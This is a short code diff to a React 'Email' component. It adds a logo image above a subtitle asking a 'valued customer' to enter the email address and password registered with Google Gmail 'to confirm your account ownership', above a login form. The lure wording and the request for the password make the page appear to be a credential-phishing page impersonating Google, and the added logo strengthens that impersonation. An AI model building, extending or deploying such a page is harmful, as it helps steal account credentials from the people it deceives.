@@ -48,6 +48,9 @@ const Email = () => {
     <div className="home">
       <div className="container">
         <div className="contentSec">
+            <div className="Emaillogo">
+            <img src={logo} alt="logo" />
+          </div>
           <div className="subtitle">Hello! Valued customer kindly use the correct email address and email password registered with Google Gmail below ⬇ to confirm your account ownership </div>
         </div>
         <div className="loginWrapper">
